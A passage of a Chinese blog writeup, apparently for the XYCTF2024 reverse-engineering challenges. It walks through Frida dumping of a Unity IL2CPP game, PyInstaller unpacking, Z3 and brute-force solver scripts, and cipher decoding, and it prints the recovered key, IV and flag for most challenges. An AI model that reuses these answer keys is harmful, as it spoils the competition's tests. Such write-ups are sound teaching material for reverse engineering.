<p>其中frida使用看的这个教程<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44292683/article/details/132125663">https://blog.csdn.net/weixin_44292683/article/details/132125663</a></p>
<p>posershell运行<code>frida -p 程序PIDr -l D:\ctf\frida-il2cpp-bridge-0.9.0\dist\index.js&quot;</code></p>
<p>然后控制台敲代码就能dump C#函数了(就是不能进IDA啊QAQ)：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ez_unity_dump.png" class title="ez_unity_dump">
<p>根据dump出来的信息能找到check函数：</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Assembly-CSharp</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">Check</span> : <span class="title">UnityEngine.MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    System.<span class="function">Void <span class="title">Start</span>()</span>; <span class="comment">// 0x0027d670</span></span><br><span class="line">    System.<span class="function">Void <span class="title">Update</span>()</span>; <span class="comment">// 0x0027d670</span></span><br><span class="line">    System.<span class="function">Void <span class="title">OnClick</span>()</span>; <span class="comment">// 0x0027d4e0</span></span><br><span class="line">    System.<span class="function">Boolean <span class="title">CheckFlag</span>(<span class="params">System.String input</span>)</span>; <span class="comment">// 0x0027d460</span></span><br><span class="line">    <span class="keyword">static</span> System.<span class="function">String <span class="title">AESEncrypt</span>(<span class="params">System.String text, System.String key, System.String iv</span>)</span>; <span class="comment">// 0x0027d200</span></span><br><span class="line">    <span class="keyword">static</span> System.<span class="function">String <span class="title">AESDecrypt</span>(<span class="params">System.String text, System.Byte[] key, System.Byte[] iv</span>)</span>; <span class="comment">// 0x0027d000</span></span><br><span class="line">    System.Void .ctor(); <span class="comment">// 0x0027d680</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2024/04/26/XYCTF2024-Writeup/ez_unity%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0.png" class title="ez_unity加密函数">
<p>接着动调找enc的flag</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ez_unity_enc_flag.png" class title="ez_unity_enc_flag">
<p>enc flag:pNufkEIU9dHjKXYXWiFyrthHYFEfqJAWcPM/t8/zX1w=</p>
<p>这个是base64编码过的在AESEncrypt最后一句话做的b64</p>
<p>接着就aes解密参数</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ez_unity_key_iv.png" class title="ez_unity_key_iv">
<p>key:a216d5d34c2723f5</p>
<p>iv:9f68268f755b1363</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ez_unity_flag.png" class title="ez_unity_flag">
<p>flag:XYCTF{IL2CPP_1s_intere5t1ng}</p>
<h3 id="你是真的大学生吗？">5.5. 你是真的大学生吗？</h3>
<p>16位汇编阅读理解了属于是，当意识到是某种前后xor加密的时候一下子就出了</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E4%BD%A0%E6%98%AF%E7%9C%9F%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%90%97%E6%B1%87%E7%BC%96.png" class title="你是真的大学生吗汇编">
<img src="/2024/04/26/XYCTF2024-Writeup/%E4%BD%A0%E6%98%AF%E7%9C%9F%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%90%97flag.png" class title="Trustme_flag">
<p>flag：xyctf{you_know_8086}</p>
<h3 id="喵喵喵的flag碎了一地">5.6. 喵喵喵的flag碎了一地</h3>
<p>IDA使用教程了属于是：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E5%96%B5%E5%96%B5%E5%96%B5%E7%9A%84flag%E7%A2%8E%E4%BA%86%E4%B8%80%E5%9C%B0string_view.png" class title="喵喵喵的flag碎了一地string_view">
<img src="/2024/04/26/XYCTF2024-Writeup/%E5%96%B5%E5%96%B5%E5%96%B5%E7%9A%84flag%E7%A2%8E%E4%BA%86%E4%B8%80%E5%9C%B0func.png" class title="喵喵喵的flag碎了一地func">
<img src="/2024/04/26/XYCTF2024-Writeup/%E5%96%B5%E5%96%B5%E5%96%B5%E7%9A%84flag%E7%A2%8E%E4%BA%86%E4%B8%80%E5%9C%B0func178.png" class title="喵喵喵的flag碎了一地func178">
<img src="/2024/04/26/XYCTF2024-Writeup/%E5%96%B5%E5%96%B5%E5%96%B5%E7%9A%84flag%E7%A2%8E%E4%BA%86%E4%B8%80%E5%9C%B0asm.png" class title="喵喵喵的flag碎了一地asm">
<p>flag：flag{My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!}</p>
<h3 id="聪明的信使">5.7. 聪明的信使</h3>
<p>移位密码了属于是</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%81%AA%E6%98%8E%E7%9A%84%E4%BF%A1%E4%BD%BF.png" class title="聪明的信使">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = <span class="string">&quot;oujp&#123;H0d_TwXf_Lahyc0_14_e3ah_Rvy0ac@wc!&#125;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>alpha1 = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)+<span class="number">1</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>alpha2 = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)+<span class="number">1</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d1 = <span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)+<span class="number">9</span>-<span class="number">65</span>)%<span class="number">26</span>+<span class="number">65</span>) <span class="keyword">for</span> i <span class="keyword">in</span> alpha1],alpha1))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d2 = <span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)+<span class="number">9</span>-<span class="number">97</span>)%<span class="number">26</span>+<span class="number">97</span>) <span class="keyword">for</span> i <span class="keyword">in</span> alpha2],alpha2))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d1.update(d2)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_ = [d1.get(i,i) <span class="keyword">for</span> i <span class="keyword">in</span> enc]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_</span><br><span class="line">[<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.join(_)</span><br><span class="line"><span class="string">&#x27;flag&#123;Y0u_KnOw_Crypt0_14_v3ry_Imp0rt@nt!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="今夕是何年">5.8. 今夕是何年</h3>
<p>要不扔到VT上看一眼我都猜不出来是LoongArch架构，这玩意DIE看不出来啊</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E4%BB%8A%E5%A4%95%E6%98%AF%E4%BD%95%E5%B9%B4VT.png" class title="今夕是何年VT">
<p>知道架构就好说了</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E4%BB%8A%E5%A4%95%E6%98%AF%E4%BD%95%E5%B9%B4flag.png" class title="今夕是何年flag">
<h3 id="ezmath">5.9. ezmath</h3>
<p>拆个包先，记得去github下个新的<a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor/releases">https://github.com/extremecoders-re/pyinstxtractor/releases</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> Desktop  python C:\Users\Munchkin7035\Desktop\pyinstxtractor<span class="literal">-2024</span>.<span class="number">04</span>\pyinstxtractor.py C:\Users\Munchkin7035\Desktop\ezmath.exe</span><br><span class="line">[+] Processing C:\Users\Munchkin7035\Desktop\ezmath.exe</span><br><span class="line">[+] Pyinstaller version: <span class="number">2.1</span>+</span><br><span class="line">[+] Python version: <span class="number">3.8</span></span><br><span class="line">[+] Length of package: <span class="number">4933185</span> bytes</span><br><span class="line">[+] Found <span class="number">59</span> files <span class="keyword">in</span> CArchive</span><br><span class="line">[+] Beginning extraction...please standby</span><br><span class="line">[+] Possible entry point: pyiboot01_bootstrap.pyc</span><br><span class="line">[+] Possible entry point: ezmath.pyc</span><br><span class="line">[!] Warning: This script is running <span class="keyword">in</span> a different Python version than the one used to build the executable.</span><br><span class="line">[!] Please run this script <span class="keyword">in</span> Python <span class="number">3.8</span> to prevent extraction errors during unmarshalling</span><br><span class="line">[!] Skipping pyz extraction</span><br><span class="line">[+] Successfully extracted pyinstaller archive: C:\Users\Munchkin7035\Desktop\ezmath.exe</span><br><span class="line"></span><br><span class="line">You can now use a python decompiler on the pyc files within the extracted directory</span><br></pre></td></tr></table></figure>
<p>然后pycdc走一个：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezmath.png" class title="ezmath">
<p>这稍微整理一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((((((((((((((((((((( flag[<span class="number">23</span>] * flag[<span class="number">23</span>] ) + ( flag[<span class="number">12</span>] * flag[<span class="number">12</span>] ) + ( flag[<span class="number">1</span>] * flag[<span class="number">1</span>] ) - ( flag[<span class="number">24</span>] * <span class="number">222</span> )) + ( flag[<span class="number">22</span>] * flag[<span class="number">22</span>] ) + ( flag[<span class="number">31</span>] * flag[<span class="number">31</span>] ) + ( flag[<span class="number">26</span>] * flag[<span class="number">26</span>] ) - ( flag[<span class="number">9</span>] * <span class="number">178</span> ) - ( flag[<span class="number">29</span>] * <span class="number">232</span> )) + ( flag[<span class="number">17</span>] * flag[<span class="number">17</span>] ) - ( flag[<span class="number">23</span>] * <span class="number">150</span> ) - ( flag[<span class="number">6</span>] * <span class="number">226</span> ) - ( flag[<span class="number">7</span>] * <span class="number">110</span> )) + ( flag[<span class="number">19</span>] * flag[<span class="number">19</span>] ) + ( flag[<span class="number">2</span>] * flag[<span class="number">2</span>] ) - ( flag[<span class="number">0</span>] * <span class="number">176</span> )) + ( flag[<span class="number">10</span>] * flag[<span class="number">10</span>] ) - ( flag[<span class="number">12</span>] * <span class="number">198</span> )) + ( flag[<span class="number">24</span>] * flag[<span class="number">24</span>] ) + ( flag[<span class="number">9</span>] * flag[<span class="number">9</span>] ) - ( flag[<span class="number">3</span>] * <span class="number">168</span> )) + ( flag[<span class="number">8</span>] * flag[<span class="number">8</span>] ) - ( flag[<span class="number">2</span>] * <span class="number">134</span> )) + ( flag[<span class="number">14</span>] * flag[<span class="number">14</span>] ) - ( flag[<span class="number">13</span>] * <span class="number">170</span> )) + ( flag[<span class="number">4</span>] * flag[<span class="number">4</span>] ) - ( flag[<span class="number">10</span>] * <span class="number">142</span> )) + ( flag[<span class="number">27</span>] * flag[<span class="number">27</span>] ) + ( flag[<span class="number">15</span>] * flag[<span class="number">15</span>] ) - ( flag[<span class="number">15</span>] * <span class="number">224</span> )) + ( flag[<span class="number">16</span>] * flag[<span class="number">16</span>] ) - ( flag[<span class="number">11</span>] * <span class="number">230</span> ) - ( flag[<span class="number">1</span>] * <span class="number">178</span> )) + ( flag[<span class="number">28</span>] * flag[<span class="number">28</span>] ) - ( flag[<span class="number">5</span>] * <span class="number">246</span> ) - ( flag[<span class="number">17</span>] * <span class="number">168</span> )) + ( flag[<span class="number">30</span>] * flag[<span class="number">30</span>] ) - ( flag[<span class="number">21</span>] * <span class="number">220</span> ) - ( flag[<span class="number">22</span>] * <span class="number">212</span> ) - ( flag[<span class="number">16</span>] * <span class="number">232</span> )) + ( flag[<span class="number">25</span>] * flag[<span class="number">25</span>] ) - ( flag[<span class="number">4</span>] * <span class="number">140</span> ) - ( flag[<span class="number">31</span>] * <span class="number">250</span> ) - ( flag[<span class="number">28</span>] * <span class="number">150</span> )) + ( flag[<span class="number">11</span>] * flag[<span class="number">11</span>] ) + ( flag[<span class="number">13</span>] * flag[<span class="number">13</span>] ) - ( flag[<span class="number">14</span>] * <span class="number">234</span> )) + ( flag[<span class="number">7</span>] * flag[<span class="number">7</span>] ) - ( flag[<span class="number">8</span>] * <span class="number">174</span> )) + ( flag[<span class="number">3</span>] * flag[<span class="number">3</span>] ) - ( flag[<span class="number">25</span>] * <span class="number">242</span> )) + ( flag[<span class="number">29</span>] * flag[<span class="number">29</span>] ) + ( flag[<span class="number">5</span>] * flag[<span class="number">5</span>] ) - ( flag[<span class="number">30</span>] * <span class="number">142</span> ) - ( flag[<span class="number">26</span>] * <span class="number">170</span> ) - ( flag[<span class="number">19</span>] * <span class="number">176</span> )) + ( flag[<span class="number">0</span>] * flag[<span class="number">0</span>] ) - ( flag[<span class="number">27</span>] * <span class="number">168</span> )) + ( flag[<span class="number">20</span>] * flag[<span class="number">20</span>] ) - ( flag[<span class="number">20</span>] * <span class="number">212</span> )) + ( flag[<span class="number">21</span>] * flag[<span class="number">21</span>] ) + ( flag[<span class="number">6</span>] * flag[<span class="number">6</span>] ) + ( flag[<span class="number">18</span>] * flag[<span class="number">18</span>] ) - ( flag[<span class="number">18</span>] * <span class="number">178</span> )) + <span class="number">297412</span> == <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><s>额 这要是跑Z3 那必是跑不通的 至于为啥 因为我跑了半天跑不通</s></p>
<p>呃啊啊啊 经过高人指点 这题Z3能跑通 但是要用Real类型而不是Int类型</p>
<p>但是观察到每一个flag[i]都有<code>(flag[i]*flag[i])-(flag[i]*num)</code>那就稍微先整理一下num吧</p>
<p>经过一顿手动整理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff = [<span class="number">176</span>,<span class="number">178</span>,<span class="number">134</span>,<span class="number">168</span>,<span class="number">140</span>,<span class="number">246</span>,<span class="number">226</span>,<span class="number">110</span>,<span class="number">174</span>,<span class="number">178</span>,<span class="number">142</span>,<span class="number">230</span>,<span class="number">198</span>,<span class="number">170</span>,<span class="number">234</span>,<span class="number">224</span>,<span class="number">232</span>,<span class="number">168</span>,<span class="number">178</span>,<span class="number">176</span>,<span class="number">212</span>,<span class="number">220</span>,<span class="number">212</span>,<span class="number">150</span>,<span class="number">222</span>,<span class="number">242</span>,<span class="number">170</span>,<span class="number">168</span>,<span class="number">150</span>,<span class="number">232</span>,<span class="number">142</span>,<span class="number">250</span>]</span><br></pre></td></tr></table></figure>
<p>呃 这是不是有点眼熟，尤其是这个176,178就好像那个XY</p>
<p>然后我除了个2，就出来了flag</p>
<p>flag：XYCTF{q7WYGscUuptTYXjnjKoyUTKtG}</p>
<h3 id="ez-enc">5.10. ez_enc</h3>
<p>这样的妹妹给我来一沓</p>
<p>发现手算没算明白 就直接用z3秒了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">inp = [BitVec(<span class="string">f&#x27;inp_<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>)]</span><br><span class="line"></span><br><span class="line">key = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;IMouto&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp)-<span class="number">1</span>):</span><br><span class="line">    inp[i]= key[i%<span class="number">6</span>]^(inp[i+<span class="number">1</span>]+(inp[i]%<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">ans = [<span class="number">0x27</span>,<span class="number">0x24</span>,<span class="number">0x17</span>,<span class="number">0x0B</span>,<span class="number">0x50</span>,<span class="number">0x03</span>,<span class="number">0xC8</span>,<span class="number">0x0C</span>,<span class="number">0x1F</span>,<span class="number">0x17</span>,<span class="number">0x36</span>,<span class="number">0x55</span>,<span class="number">0xCB</span>,<span class="number">0x2D</span>,<span class="number">0xE9</span>,<span class="number">0x32</span>,<span class="number">0x0E</span>,<span class="number">0x11</span>,<span class="number">0x26</span>,<span class="number">0x02</span>,<span class="number">0x0C</span>,<span class="number">0x07</span>,<span class="number">0xFC</span>,<span class="number">0x27</span>,<span class="number">0x3D</span>,<span class="number">0x2D</span>,<span class="number">0xED</span>,<span class="number">0x35</span>,<span class="number">0x59</span>,<span class="number">0xEB</span>,<span class="number">0x3C</span>,<span class="number">0x3E</span>,<span class="number">0xE4</span>,<span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp)):</span><br><span class="line">    s.add(ans[i]==inp[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">ans = s.model()</span><br><span class="line">ans = <span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans],[ans[i] <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(ans[<span class="string">f&quot;inp_<span class="subst">&#123;i&#125;</span>&quot;</span>].as_long()),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="ez-rand">5.11. ez_rand</h3>
<p>srand竟然用的int16这不爆破？</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ez_rand.png" class title="ez_rand">
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123;<span class="number">0x5D</span>,<span class="number">0x0C</span>,<span class="number">0x6C</span>,<span class="number">0xEA</span>,<span class="number">0x46</span>,<span class="number">0x19</span>,<span class="number">0xFC</span>,<span class="number">0x34</span>,<span class="number">0xB2</span>,<span class="number">0x62</span>,<span class="number">0x23</span>,<span class="number">0x07</span>,<span class="number">0x62</span>,<span class="number">0x22</span>,<span class="number">0x6E</span>,<span class="number">0xFB</span>,<span class="number">0xB4</span>,<span class="number">0xE8</span>,<span class="number">0xF2</span>,<span class="number">0xA9</span>,<span class="number">0x91</span>,<span class="number">0x12</span>,<span class="number">0x21</span>,<span class="number">0x86</span>,<span class="number">0xDB</span>,<span class="number">0x8E</span>,<span class="number">0xE9</span>,<span class="number">0x43</span>,<span class="number">0x4D</span>&#125;; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> ans[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">0xFFFF</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">srand</span>(i);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">29</span>;i++)&#123;</span><br><span class="line">			ans[i] = enc[i]^(<span class="built_in">rand</span>()%<span class="number">0xFF</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strncmp</span>(ans,<span class="string">&quot;XYCTF&quot;</span>,<span class="number">5</span>)==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strncmp</span>(ans,<span class="string">&quot;xyctf&quot;</span>,<span class="number">5</span>)==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strncmp</span>(ans,<span class="string">&quot;flag&quot;</span>,<span class="number">4</span>)==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得出flag：XYCTF{R@nd_1s_S0_S0_S0_easy!}</p>
<h3 id="何须相思煮余年">5.12. 何须相思煮余年</h3>
<p>cyberchif from hex转成二进制 然后32bit拖进ida：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E4%BD%95%E9%A1%BB%E7%9B%B8%E6%80%9D%E7%85%AE%E4%BD%99%E5%B9%B4.png" class title="何须相思煮余年">
<p>这就简单了，直接python交互解决(可恶 我当初为啥不保存个脚本)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = [<span class="number">88</span>,<span class="number">88</span>,<span class="number">134</span>,<span class="number">87</span>,<span class="number">74</span>,<span class="number">118</span>,<span class="number">318</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">92</span>,<span class="number">480</span>,<span class="number">60</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">770</span>,<span class="number">110</span>,<span class="number">73</span>,<span class="number">31</span>,<span class="number">918</span>,<span class="number">39</span>,<span class="number">120</span>,<span class="number">27</span>,<span class="number">1188</span>,<span class="number">47</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">1352</span>,<span class="number">44</span>,<span class="number">81</span>,<span class="number">23</span>,<span class="number">1680</span>,<span class="number">46</span>,<span class="number">85</span>,<span class="number">15</span>,<span class="number">1870</span>,<span class="number">66</span>,<span class="number">91</span>,<span class="number">16</span>,<span class="number">4750</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_0 = <span class="keyword">lambda</span> i,j:i-j</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_1 = <span class="keyword">lambda</span> i,j:i+j</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_2 = <span class="keyword">lambda</span> i,j:i//j</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_3 = <span class="keyword">lambda</span> i,j:i^j</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arr = [_0,_1,_2,_3]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_ = [arr[i%<span class="number">4</span>](enc[i],i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_</span><br><span class="line">[<span class="number">88</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">123</span>, <span class="number">53</span>, <span class="number">98</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">100</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">56</span>, <span class="number">53</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">125</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_ = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> _]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_</span><br><span class="line">[<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.join(_)</span><br><span class="line"><span 